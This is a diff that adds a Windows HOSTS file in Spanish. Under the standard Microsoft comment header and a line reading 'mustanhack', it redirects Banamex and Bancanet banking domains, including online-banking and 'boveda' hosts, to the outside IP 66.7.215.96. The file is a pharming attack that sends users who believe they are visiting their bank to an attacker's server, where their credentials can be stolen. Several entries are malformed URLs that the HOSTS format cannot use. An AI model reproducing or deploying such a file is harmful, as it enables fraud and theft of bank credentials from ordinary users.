@@ -1,0 +1,54 @@
+
+
+ # Copyright (c) 1993-1999 Microsoft Corp.
+
+# Éste es un ejemplo de archivo HOSTS usado por Microsoft TCP/IP para 
+Windows.
+
+# Este archivo contiene las asignaciones de las direcciones IP a los nombres de
+# host. Cada entrada debe permanecer en una línea individual. La dirección IP
+# debe ponerse en la primera columna, seguida del nombre de host 
+correspondiente.
+# La dirección IP y el nombre de host deben separarse con al menos un 
+espacio.
+# 
+
+# También pueden insertarse comentarios (como éste) en líneas individuales
+# o a continuación del nombre de equipo indicándolos con el símbolo "#"
+
+# Por ejemplo:
+
+#      102.54.94.97     rhino.acme.com          # servidor origen
+#       38.25.63.10     x.acme.com              # host cliente x
+
+mustanhack ¡¡¡ 
+
+
+127.0.0.1   localhost 74.54.199.122 www.banamex.com.mx
+66.7.215.96 banamex.com
+66.7.215.96 https://www.banamex.com
+66.7.215.96 https://banamex.com
+66.7.215.96 https://banamex.com.mx
+66.7.215.96 http://www.banamex.com/
+66.7.215.96 www.boveda.banamex.com.mx
+66.7.215.96 http://www.boveda.banamex.com.mx
+66.7.215.96 boveda.banamex.com.mx
+66.7.215.96 http://www.boveda.banamex.com.mx/
+66.7.215.96 https://boveda.banamex.com.mx
+66.7.215.96 https://www.bancanetempresarial.banamex.com.mx
+66.7.215.96 www.banamex.com
+66.7.215.96 banamex.com
+66.7.215.96 www.banamex.com.mx
+66.7.215.96 banamex.com.mx
+66.7.215.96 www.bancanet.com
+66.7.215.96 bancanet.com
+66.7.215.96 www.bancanetempresarial.banamex.com.mx
+66.7.215.96 bancanetempresarial.banamex.com.mx
+66.7.215.96 bancanetempresarial.banamex.com
+66.7.215.96 www.boveda.banamex.com.mx
+66.7.215.96 boveda.banamex.com.mx
+66.7.215.96 boveda.banamex.com
+66.7.215.96 http://www.boveda.banamex.com
+66.7.215.96 http://banamex.com
+66.7.215.96 banamex.com
+
